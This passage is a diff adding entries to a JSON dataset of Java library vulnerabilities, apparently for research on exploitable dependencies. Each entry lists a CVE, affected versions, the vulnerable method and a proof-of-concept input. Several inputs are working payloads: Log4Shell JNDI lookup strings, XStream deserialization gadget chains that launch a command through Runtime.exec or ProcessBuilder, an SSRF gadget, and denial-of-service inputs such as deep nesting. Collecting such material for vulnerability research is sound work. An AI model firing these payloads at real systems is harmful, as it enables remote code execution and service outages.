}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}\n",
+    "CVE_Description": "Affected versions of net.minidev:json-smart are vulnerable to Denial of Service (DoS) due to a StackOverflowError when parsing a deeply nested JSON array or object.\n\nWhen reaching a ‘[‘ or ‘{‘ character in the JSON input, the code parses an array or an object respectively. It was discovered that the 3PP does not have any limit to the nesting of such arrays or objects. Since the parsing of nested arrays and objects is done recursively, nesting too many of them can cause stack exhaustion (stack overflow) and crash the softwar",
+    "CVE_Class": "net.minidev.json.parser.JSONParser",
+    "CVE_Method": "parse(java.lang.String):net.minidev.json.JSONObject"
+  },
+
+  {
+    "CVE_Number": "CVE-2021-37714",
+    "Category": "security/DoS",
+    "CVE_Library": "org.jsoup/jsoup",
+    "CVE_Library_version": "<1.14.2",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-37714",
+    "CVE_POC": "/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file/1605.html.gz",
+    "CVE_Description": "jsoup is a Java library for working with HTML. Those using jsoup versions prior to 1.14.2 to parse untrusted HTML or XML may be vulnerable to DOS attacks. If the parser is run on user supplied input, an attacker may supply content that causes the parser to get stuck (loop indefinitely until cancelled), to complete more slowly than usual, or to throw an unexpected exception. This effect may support a denial of service attack. The issue is patched in version 1.14.2. There are a few available workarounds. Users may rate limit input parsing, limit the size of inputs based on system resources, and/or implement thread watchdogs to cap and timeout parse runtimes.\n\n",
+    "CVE_Class": "org.jsoup.Jsoup",
+    "CVE_Method": "parse(java.io.File,java.lang.String):org.jsoup.nodes.Document",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2020-15250",
+    "Category": "information-disclosure",
+    "CVE_Library": "junit/junit",
+    "CVE_Library_version": ">=4.7,<4.13.1",
+    "CVE_Library_url": "https://github.com/advisories/GHSA-269g-pwp5-87pp",
+    "CVE_POC": "secret.txt",
+    "CVE_Description": "The JUnit4 test rule TemporaryFolder contains a local information disclosure vulnerability.\n\nExample of vulnerable code:\n\npublic static class HasTempFolder {\n    @Rule\n    public TemporaryFolder folder = new TemporaryFolder();\n\n    @Test\n    public void testUsingTempFolder() throws IOException {\n        folder.getRoot(); // Previous file permissions: `drwxr-xr-x`; After fix:`drwx------`\n        File createdFile= folder.newFile(\"myfile.txt\"); // unchanged/irrelevant file permissions\n        File createdFolder= folder.newFolder(\"subfolder\"); // unchanged/irrelevant file permissions\n        // ...\n    }\n}\nOn Unix like systems, the system's temporary directory is shared between all users on that system. Because of this, when files and directories are written into this directory they are, by default, readable by other users on that same system.\n\nThis vulnerability does not allow other users to overwrite the contents of these directories or files. This is purely an information disclosure vulnerability.\n\nWhen analyzing the impact of this vulnerability, here are the important questions to ask:\n\nDo the JUnit tests write sensitive information, like API keys or passwords, into the temporary folder?\nIf yes, this vulnerability impacts you, but only if you also answer 'yes' to question 2.\nIf no, this vulnerability does not impact you.\nDo the JUnit tests ever execute in an environment where the OS has other untrusted users.\nThis may apply in CI/CD environments but normally won't be 'yes' for personal developer machines.\nIf yes, and you answered 'yes' to question 1, this vulnerability impacts you.\nIf no, this vulnerability does not impact you.\n",
+    "CVE_Class": "org.junit.rules.TemporaryFolder",
+    "CVE_Method": "newFile(java.lang.String):java.io.File",
+    "need_check": 1
+  },
+
+  {
+    "CVE_Number": "CVE-2018-12418",
+    "Category": "denial-of-service",
+    "CVE_Library": "com.github.junrar/junrar",
+    "CVE_Library_version": "<1.0.1",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2018-12418",
+    "CVE_POC": "/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file/11_hang_junrar_zero_header2.rar",
+    "CVE_Description": "Archive.java in Junrar before 1.0.1, as used in Apache Tika and other products, is affected by a denial of service vulnerability due to an infinite loop when handling corrupt RAR files.",
+    "CVE_Class": "com.github.junrar.Archive",
+    "CVE_Method": "<init>(java.io.File):void",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2022-23596",
+    "Category": "denial-of-service",
+    "CVE_Library": "com.github.junrar/junrar",
+    "CVE_Library_version": "<7.4.1",
+    "CVE_Library_url": "https://github.com/junrar/junrar/issues/73",
+    "CVE_POC": "\"/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file/CVE-2022-23596.rar\",\"/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file\"",
+    "CVE_Description": "Junrar is an open source java RAR archive library. In affected versions A carefully crafted RAR archive can trigger an infinite loop while extracting said archive. The impact depends solely on how the application uses the library, and whether files can be provided by malignant users. The problem is patched in 7.4.1. There are no known workarounds and users are advised to upgrade as soon as possible.",
+    "CVE_Class": "com.github.junrar.Junrar",
+    "CVE_Method": "extract(java.io.File, java.io.File):java.util.List",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2021-44228",
+    "Category": "remote-code-execution",
+    "CVE_Library": "org.apache.logging.log4j/log4j-api",
+    "CVE_Library_version": ">=2.0-beta9,<2.12.2,>2.12.3,<2.3.1,>2.3.1,<2.15.0",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+    "CVE_POC": "${jndi:ldap://127.0.0.1:8079}",
+    "CVE_Description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. ",
+    "CVE_Class": "org.apache.logging.log4j.Logger",
+    "CVE_Method": "error(java.lang.String):void",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2021-44228",
+    "Category": "remote-code-execution",
+    "CVE_Library": "org.apache.logging.log4j/log4j-api",
+    "CVE_Library_version": ">=2.0-beta9,<2.12.2,>2.12.3,<2.3.1,>2.3.1,<2.15.0",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+    "CVE_POC": "${jndi:ldap://127.0.0.1:8079}",
+    "CVE_Description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. ",
+    "CVE_Class": "org.apache.logging.log4j.Logger",
+    "CVE_Method": "info(java.lang.String):void",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2021-45046",
+    "Category": "remote-code-execution",
+    "CVE_Library": "org.apache.logging.log4j/log4j-api",
+    "CVE_Library_version": "2.15.0",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-45046",
+    "CVE_POC": "${jndi:ldap://0.0.0.0:1389/Log4jRCE}",
+    "CVE_Description": "It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allows attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in an information leak and remote code execution in some environments and local code execution in all environments. Log4j 2.16.0 (Java 8) and 2.12.2 (Java 7) fix this issue by removing support for message lookup patterns and disabling JNDI functionality by default.",
+    "CVE_Class": "org.apache.logging.log4j.Logger",
+    "CVE_Method": "info(java.lang.String):void"
+  },
+  {
+    "CVE_Number": "CVE-2015-2156",
+    "Category": "security‑bypass",
+    "CVE_Library": "io.netty/netty",
+    "CVE_Library_version": "<3.9.8.Final,>=3.10.0,<3.10.3.Final",
+    "CVE_Library_url": "https://github.com/advisories/GHSA-xfv3-rrfm-f2rv",
+    "CVE_POC": "aaa='bbb;ccc=ddd",
+    "CVE_Description": "Netty before 3.9.8.Final, 3.10.x before 3.10.3.Final, 4.0.x before 4.0.28.Final, and 4.1.x before 4.1.0.Beta5 and Play Framework 2.x before 2.3.9 might allow remote attackers to bypass the httpOnly flag on cookies and obtain sensitive information by leveraging improper validation of cookie name and value characters.",
+    "CVE_Class": "org.jboss.netty.handler.codec.http.CookieDecoder",
+    "CVE_Method": "decode(java.lang.String):org.jboss.netty.handler.codec.http.cookie.Cookie"
+  },
+  {
+    "CVE_Number": "CVE-2023-34453",
+    "Category": "denial-of-service",
+    "CVE_Library": "org.xerial.snappy/snappy-java",
+    "CVE_Library_version": "<=1.1.10.0",
+    "CVE_Library_url": "https://github.com/advisories/GHSA-pqr6-cmr2-h8hf",
+    "CVE_POC": "new int[0x20000000]",
+    "CVE_Description": "The function shuffle(int[] input) in the file BitShuffle.java receives an array of integers and applies a bit shuffle on it. It does so by multiplying the length by 4 and passing it to the natively compiled shuffle function.\n\npublic static byte[] shuffle(int[] input) throws IOException {\n        byte[] output = new byte[input.length * 4];\n        int numProcessed = impl.shuffle(input, 0, 4, input.length * 4, output, 0);\n        assert(numProcessed == input.length * 4);\n        return output;\n    }\nSince the length is not tested, the multiplication by four can cause an integer overflow and become a smaller value than the true size, or even zero or negative. In the case of a negative value, a “java.lang.NegativeArraySizeException” exception will raise, which can crash the program. In a case of a value that is zero or too small, the code that afterwards references the shuffled array will assume a bigger size of the array, which might cause exceptions such as “java.lang.ArrayIndexOutOfBoundsException”.\nThe same issue exists also when using the “shuffle” functions that receive a double, float, long and short, each using a different multiplier that may cause the same issue.\n\n",
+    "CVE_Class": "org.xerial.snappy.BitShuffle",
+    "CVE_Method": "shuffle(int[]):byte[]",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2023-43642",
+    "Category": "denial-of-service",
+    "CVE_Library": "org.xerial.snappy/snappy-java",
+    "CVE_Library_version": "<=1.1.10.3",
+    "CVE_Library_url": "https://github.com/advisories/GHSA-55g7-9cwv-5qfv",
+    "CVE_POC": "{\n -126, 'S', 'N', 'A', 'P', 'P', 'Y',\n  0, 0, 0, 0, 0, 0, 0, 0, 0,\n (byte) 0x7f, (byte) 0xff, (byte) 0xff, (byte) 0xff\n        }",
+    "CVE_Description": "snappy-java is a data compression library in Java. Its SnappyInputStream was found to be vulnerable to Denial of Service (DoS) attacks when decompressing data with a too-large chunk size. Due to missing upper bound check on chunk length, an unrecoverable fatal error can occur. While performing mitigation efforts related to CVE-2023-34455 in Confluent products, our Application Security team closely analyzed the fix that was accepted and merged into snappy-java version 1.1.10.1 in this commit. The check on line 421 only attempts to check if chunkSize is not a negative value. We believe that this is an inadequate fix as it misses an upper-bounds check for overly positive values such as 0x7FFFFFFF (or (2,147,483,647 in decimal) before actually attempting to allocate the provided unverified number of bytes via the “chunkSize” variable. This missing upper-bounds check can lead to the applications depending upon snappy-java to allocate an inappropriate number of bytes on the heap which can then cause an java.lang.OutOfMemoryError exception. Under some specific conditions and contexts, this can lead to a Denial-of-Service (DoS) attack with a direct impact on the availability of the dependent implementations based on the usage of the snappy-java library for compression/decompression needs.",
+    "CVE_Class": "org.xerial.snappy.SnappyInputStream",
+    "CVE_Method": "read(byte[]):int"
+  },
+  {
+    "CVE_Number": "CVE-2020-5408",
+    "Category": "null-pointer-exception",
+    "CVE_Library": "org.springframework.security/spring-security-crypto",
+    "CVE_Library_version": "<5.3.2,<5.2.4,<5.1.0,<5.0.16,<4.2.16",
+    "CVE_Library_url": "https://github.com/spring-projects/spring-security/issues/8317,https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKSECURITY-570204",
+    "CVE_POC": "null",
+    "CVE_Description": "BCryptPasswordEncoder.encode() throws a Null Pointer Exception (NPE) when passing in a null rawPassword and then rawPassword.toString() is called inside the method.\n\nThis method can and should be made null-safe, either:\n\ncheck for null and return null, or\nthrow some kind of exception",
+    "CVE_Class": "org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder",
+    "CVE_Method": "encode(java.lang.CharSequence):java.lang.String"
+  },
+  {
+    "CVE_Number": "CVE-2018-1274",
+    "Category": "Dos",
+    "CVE_Library": "org.springframework.data/spring-data-commons",
+    "CVE_Library_version": ">=1.13,<=1.13.10,>=2.0,<=2.0.5",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1274",
+    "CVE_POC": "",
+    "CVE_Description": "Spring Data Commons, versions 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property path parser vulnerability caused by unlimited resource allocation. An unauthenticated remote malicious user (or attacker) can issue requests against Spring Data REST endpoints or endpoints using property path parsing which can cause a denial of service (CPU and memory consumption).",
+    "CVE_Class": "",
+    "CVE_Method": "",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2022-22976",
+    "Category": "integer-overflow",
+    "CVE_Library": "org.springframework.security/spring-security-crypto",
+    "CVE_Library_version": ">=5.5.0,<5.5.7,>=5.6.0,<5.6.4",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2022-22976",
+    "CVE_POC": "",
+    "CVE_Description": "Spring Security versions 5.5.x prior to 5.5.7, 5.6.x prior to 5.6.4, and earlier unsupported versions contain an integer overflow vulnerability. When using the BCrypt class with the maximum work factor (31), the encoder does not perform any salt rounds, due to an integer overflow error. The default settings are not affected by this CVE.",
+    "CVE_Class": "",
+    "CVE_Method": "",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2018-15756",
+    "Category": "DOS",
+    "CVE_Library": "spring-projects/spring-framework",
+    "CVE_Library_version": ">=5.1,<5.1.1,<5.0.10,<4.3.20",
+    "CVE_Library_url": "https://springframework.org.cn/security/cve-2018-15756/",
+    "CVE_POC": "",
+    "CVE_Description": "Spring Framework, version 5.1, versions 5.0.x prior to 5.0.10, versions 4.3.x prior to 4.3.20, and older unsupported versions on the 4.2.x branch provide support for range requests when serving static resources through the ResourceHttpRequestHandler, or starting in 5.0 when an annotated controller returns an org.springframework.core.io.Resource. A malicious user (or attacker) can add a range header with a high number of ranges, or with wide ranges that overlap, or both, for a denial of service attack. This vulnerability affects applications that depend on either spring-webmvc or spring-webflux. Such applications must also have a registration for serving static resources (e.g. JS, CSS, images, and others), or have an annotated controller that returns an org.springframework.core.io.Resource. Spring Boot applications that depend on spring-boot-starter-web or spring-boot-starter-webflux are ready to serve static resources out of the box and are therefore vulnerable.",
+    "CVE_Class": "",
+    "CVE_Method": "",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2022-22965",
+    "Category": "remote-code-execution",
+    "CVE_Library": "spring-projects/spring-framework",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/cve-2022-22965",
+    "CVE_POC": "",
+    "CVE_Description": "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.",
+    "CVE_Class": "",
+    "CVE_Method": "",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "TwelveMonkeys-595",
+    "Category": "denial-of-service",
+    "CVE_Library": "com.twelvemonkeys.imageio/imageio-jpeg",
+    "CVE_Library_version": "3.6.3",
+    "CVE_Library_url": "https://security.snyk.io/vuln/SNYK-JAVA-COMTWELVEMONKEYSIMAGEIO-1083830, https://github.com/haraldk/TwelveMonkeys/issues/595",
+    "CVE_POC": "",
+    "CVE_Description": "In trying to break PDFBox via embedded corrupt jpegs, I found an infinite loop in twelvemonkeys. Many thanks to Tilman Hausherr for helping me replicate this with the unembedded jpeg and for recommending testing with TwelveMonkeys.\n\nFile:\nextracted\n\n        Iterator<ImageReader> readers = ImageIO.getImageReadersByFormatName(\"JPEG\");\n        ImageReader reader = null;\n        while (readers.hasNext()) {\n            reader = readers.next();\n            break;\n        }\n        try (InputStream is = Files.newInputStream(p)) {\n            ImageInputStream iis = ImageIO.createImageInputStream(is);\n\n            reader.setInput(iis);\n            ImageReadParam irp = reader.getDefaultReadParam();\n\n            Raster raster;\n            try {\n                BufferedImage image = reader.read(0, irp);\n                raster = image.getRaster();\n            } catch (IIOException var20) {\n                raster = reader.readRaster(0, irp);\n            }\n        }",
+    "CVE_Class": "com.twelvemonkeys.imageio.plugins.jpeg.JPEGImageReader",
+    "CVE_Method": "read(int, ImageReadParam):java.awt.image.BufferedImage",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2017-7957",
+    "Category": "denial-of-service",
+    "CVE_Library": "com.thoughtworks.xstream/xstream",
+    "CVE_Library_version": "<=1.4.9",
+    "CVE_Library_url": "https://x-stream.github.io/CVE-2017-7957.html",
+    "CVE_POC": "<void/>",
+    "CVE_Description": "XStream through 1.4.9, when a certain denyTypes workaround is not used, mishandles attempts to create an instance of the primitive type 'void' during unmarshalling, leading to a remote application crash, as demonstrated by an xstream.fromXML(\"<void/>\") call.",
+    "CVE_Class": "com.thoughtworks.xstream.XStream",
+    "CVE_Method": "fromXML(java.lang.String):java.lang.Object"
+  },
+  {
+    "CVE_Number": "CVE-2017-7957",
+    "Category": "denial-of-service",
+    "CVE_Library": "com.thoughtworks.xstream/xstream",
+    "CVE_Library_version": "<=1.4.9",
+    "CVE_Library_url": "https://x-stream.github.io/CVE-2017-7957.html",
+    "CVE_POC": "<void/>",
+    "CVE_Description": "XStream through 1.4.9, when a certain denyTypes workaround is not used, mishandles attempts to create an instance of the primitive type 'void' during unmarshalling, leading to a remote application crash, as demonstrated by an xstream.fromXML(\"<void/>\") call.",
+    "CVE_Class": "com.thoughtworks.xstream.XStream",
+    "CVE_Method": "fromXML(java.lang.String):com.xebia.cqrs.domain.Event"
+  },
+  {
+    "CVE_Number": "CVE-2020-26258",
+    "Category": "server-side-request-forgery",
+    "CVE_Library": "com.thoughtworks.xstream/xstream",
+    "CVE_Library_version": "<=1.4.14",
+    "CVE_Library_url": "https://x-stream.github.io/CVE-2020-26258.html",
+    "CVE_POC": " \"<map>\\n  <entry>\\n    <jdk.nashorn.internal.objects.NativeString>\\n      <flags>0</flags>\\n      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\\n        <dataHandler>\\n          <dataSource class='javax.activation.URLDataSource'>\\n            <url>\" + targetUrl + \"</url>\\n          </dataSource>\\n          <transferFlavors/>\\n        </dataHandler>\\n        <dataLen>0</dataLen>\\n </value>\\n    </jdk.nashorn.internal.objects.NativeString>\\n    <string>test</string>\\n  </entry>\\n </map>\";\n",
+    "CVE_Description": "XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.15, a Server-Side Forgery Request vulnerability can be activated when unmarshalling. The vulnerability may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream.",
+    "CVE_Class": "com.thoughtworks.xstream.XStream",
+    "CVE_Method": "fromXML(java.lang.String):java.lang.Object"
+  },
+
+  {
+    "CVE_Number": "CVE-2021-21341",
+    "Category": "denial-of-service",
+    "CVE_Library": "com.thoughtworks.xstream/xstream",
+    "CVE_Library_version": "<=1.4.15",
+    "CVE_Library_url": "https://x-stream.github.io/CVE-2021-21341.html",
+    "CVE_POC": "<java.util.PriorityQueue serialization='custom'>\n  <unserializable-parents/>\n  <java.util.PriorityQueue>\n    <default>\n      <size>2</size>\n      <comparator class='javafx.collections.ObservableList$1'/>\n    </default>\n    <int>3</int>\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n      <dataHandler>\n        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n          <is class='java.io.ByteArrayInputStream'>\n            <buf></buf>\n            <pos>-2147483648</pos>\n            <mark>0</mark>\n            <count>0</count>\n          </is>\n          <consumed>false</consumed>\n        </dataSource>\n        <transferFlavors/>\n      </dataHandler>\n      <dataLen>0</dataLen>\n    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\n  </java.util.PriorityQueue>\n</java.util.PriorityQueue>",
+    "CVE_Description": "The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject a manipulated ByteArrayInputStream (or derived class), that can cause an endless loop resulting in a denial of service.",
+    "CVE_Class": "com.thoughtworks.xstream.XStream",
+    "CVE_Method": "fromXML(java.lang.String):java.lang.Object"
+  },
+
+  {
+    "CVE_Number": "CVE-2021-39144",
+    "Category": "remote-code-execution",
+    "CVE_Library": "com.thoughtworks.xstream/xstream",
+    "CVE_Library_version": "<1.4.17",
+    "CVE_Library_url": "https://x-stream.github.io/CVE-2021-39144.html",
+    "CVE_POC": "<java.util.PriorityQueue serialization='custom'>\n  <unserializable-parents/>\n  <java.util.PriorityQueue>\n    <default>\n      <size>2</size>\n    </default>\n    <int>3</int>\n    <dynamic-proxy>\n      <interface>java.lang.Comparable</interface>\n      <handler class='sun.tracing.NullProvider'>\n        <active>true</active>\n        <providerType>java.lang.Comparable</providerType>\n        <probes>\n          <entry>\n            <method>\n              <class>java.lang.Comparable</class>\n              <name>compareTo</name>\n              <parameter-types>\n                <class>java.lang.Object</class>\n              </parameter-types>\n            </method>\n            <sun.tracing.dtrace.DTraceProbe>\n              <proxy class='java.lang.Runtime'/>\n              <implementing__method>\n                <class>java.lang.Runtime</class>\n                <name>exec</name>\n                <parameter-types>\n                  <class>java.lang.String</class>\n                </parameter-types>\n              </implementing__method>\n            </sun.tracing.dtrace.DTraceProbe>\n          </entry>\n        </probes>\n      </handler>\n    </dynamic-proxy>\n    <string>calc</string>\n  </java.util.PriorityQueue>\n</java.util.PriorityQueue>",
+    "CVE_Description": "The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that result in execution of a local command on the server.",
+    "CVE_Class": "com.thoughtworks.xstream.XStream",
+    "CVE_Method": "fromXML(java.lang.String):java.lang.Object"
+  },
+
+  {
+    "CVE_Number": "CVE-2021-43859",
+    "Category": "denial-of-service",
+    "CVE_Library": "com.thoughtworks.xstream/xstream",
+    "CVE_Library_version": "<=1.4.18",
+    "CVE_Library_url": "https://x-stream.github.io/CVE-2021-43859.html",
+    "CVE_POC": "<set>\n  <set>\n    <string>a</string>\n    <set>\n      <string>a</string>\n      <set>\n        <string>a</string>\n      </set>\n      <set>\n        <string>b</string>\n      </set>\n    </set>\n    <set>\n      <set reference=\"../../set/set\"/>\n      <string>b</string>\n      <set reference=\"../../set/set[2]\"/>\n    </set>\n  </set>\n  <set>\n    <set reference=\"../../set/set\"/>\n    <string>b</string>\n    <set reference=\"../../set/set[2]\"/>\n  </set>\n</set>",
+    "CVE_Description": "The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that result in exponential recursively hashcode calculation, causing a denial of service.",
+    "CVE_Class": "com.thoughtworks.xstream.XStream",
+    "CVE_Method": "fromXML(java.lang.String):java.lang.Object"
+  },
+  {
+    "CVE_Number": "CVE-2022-41966",
+    "Category": "denial-of-service",
+    "CVE_Library": "com.thoughtworks.xstream/xstream",
+    "CVE_Library_version": "<=1.4.19",
+    "CVE_Library_url": "https://x-stream.github.io/CVE-2022-41966.html",
+    "CVE_POC": "<set>\n  <set>\n    <set>\n      <set>\n        <set>\n          <set>\n            <set>\n              <string>a</string>\n            </set>\n            <set>\n              <string>b</string>\n            </set>\n          </set>\n          <set>\n            <string>c</string>\n            <set reference='../../../set/set[2]'/>\n          </set>\n        </set>\n      </set>\n    </set>\n  </set>\n</set>",
+    "CVE_Description": "The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that result in a stack overflow calculating a recursive hash set causing a denial of service.\n\n",
+    "CVE_Class": "com.thoughtworks.xstream.XStream",
+    "CVE_Method": "fromXML(java.lang.String):java.lang.Object"
+  },
+
+  {
+    "CVE_Number": "CVE-2020-26217",
+    "Category": "remote-code-execution",
+    "CVE_Library": "com.thoughtworks.xstream/xstream",
+    "CVE_Library_version": "<=1.4.13",
+    "CVE_Library_url": "https://x-stream.github.io/CVE-2020-26217.html",
+    "CVE_POC": "<map>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString>\n      <flags>0</flags>\n      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n        <dataHandler>\n          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n            <contentType>text/plain</contentType>\n            <is class='java.io.SequenceInputStream'>\n              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n                <iterator class='javax.imageio.spi.FilterIterator'>\n                  <iter class='java.util.ArrayList$Itr'>\n                    <cursor>0</cursor>\n                    <lastRet>-1</lastRet>\n                    <expectedModCount>1</expectedModCount>\n                    <outer-class>\n                      <java.lang.ProcessBuilder>\n                        <command>\n                          <string>calc</string>\n                        </command>\n                      </java.lang.ProcessBuilder>\n                    </outer-class>\n                  </iter>\n                  <filter class='javax.imageio.ImageIO$ContainsFilter'>\n                    <method>\n                      <class>java.lang.ProcessBuilder</class>\n                      <name>start</name>\n                      <parameter-types/>\n                    </method>\n                    <name>start</name>\n                  </filter>\n                  <next/>\n                </iterator>\n                <type>KEYS</type>\n              </e>\n              <in class='java.io.ByteArrayInputStream'>\n                <buf></buf>\n                <pos>0</pos>\n                <mark>0</mark>\n                <count>0</count>\n              </in>\n            </is>\n            <consumed>false</consumed>\n          </dataSource>\n          <transferFlavors/>\n        </dataHandler>\n        <dataLen>0</dataLen>\n      </value>\n    </jdk.nashorn.internal.objects.NativeString>\n    <string>test</string>\n  </entry>\n</map>",
+    "CVE_Description": "The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that can execute arbitrary shell commands.This issue is a variation of CVE-2013-7285, this time using a different set of classes of the Java runtime environment, none of which is part of the XStream default blacklist. The same issue has already been reported for Strut's XStream plugin in CVE-2017-9805, but the XStream project has never been informed about it.",
+    "CVE_Class": "com.thoughtworks.xstream.XStream",
+    "CVE_Method": "fromXML(java.lang.String):java.lang.Object"
+  },
+
+  {
+    "CVE_Number": "CVE-2022-24615",
+    "Category": "denial-of-service",
+    "CVE_Library": "net.lingala.zip4j/zip4j",
+    "CVE_Library_version": "<=2.10.0",
+    "CVE_Library_url": "https://github.com/advisories/GHSA-q62h-jw38-24vh",
+    "CVE_POC": "/VESTA/files/crash-a49f954b47e05cc5265db441a64e5d2d55cb33b8",
+    "CVE_Description": "zip4j up to 2.9.1 can throw various uncaught exceptions while parsing a specially crafted ZIP file, which could result in an application crash. This could be used to mount a denial of service attack against services that use zip4j library.",
+    "CVE_Class": "net.lingala.zip4j.io.inputstream.ZipInputStream",
+    "CVE_Method": "getNextEntry():net.lingala.zip4j.model.LocalFileHeader",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "Zip4J-263",
+    "Category": "null-pointer-exception",
+    "CVE_Library": "net.lingala.zip4j/zip4j",
+    "CVE_Library_version": "<=2.6.4",
+    "CVE_Library_url": "https://security.snyk.io/vuln/SNYK-JAVA-NETLINGALAZIP4J-1074967",
+    "CVE_POC": "null",
+    "CVE_Description": "Current version (2.6.4) allows to construct a ZipFile with a null File reference: (i.e. new ZipFile((File) null)) without proper validation. This does not happen if you use the constructor with the String argument as internally it does a new File(string) and if the string is null the File constructor throws a NPE.\n\nThe consequence of this is that when you want to do an operation with the ZipFile instance (e.g. zipFile.getFileHeaders() it throws a NPE on this line.\n\nTo avoid these scenarios, it should be properly validated on construction of ZipFile if accepting a null reference as File is not valid later.\n\nOn previous versions (1.3.2) there was a check that somehow on later releases it was removed (particularly on this commit).\nThis is 1.3.2:",
+    "CVE_Class": "net.lingala.zip4j.ZipFile",
+    "CVE_Method": "<init>(java.io.File):void"
+  },
+  {
+    "CVE_Number": "CVE-2018-1002201",
+    "Category": "directory-traversal",
+    "CVE_Library": "org.zeroturnaround/zt-zip",
